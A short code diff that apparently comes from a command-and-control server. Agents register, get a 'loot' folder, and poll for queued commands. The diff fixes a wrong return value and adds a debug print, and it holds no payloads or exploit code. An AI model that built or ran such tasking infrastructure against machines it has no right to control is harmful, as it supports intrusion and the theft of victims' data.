@@ -31,7 +31,7 @@ def register_agent():
             agent_id = new_agent.id
             db.session.commit()
             os.mkdir(f"loot/agent_{agent_id}")
-            return str(id)
+            return str(agent_id)
         return "Bad Request"
 
 
@@ -54,6 +54,7 @@ def get_command():
             res = Command.query.filter(
                 Command.agentID == agent_id, Command.retrieved == False
             ).first()
+            print(res)
             if res is None:
                 db.session.commit()
                 db.session.flush()
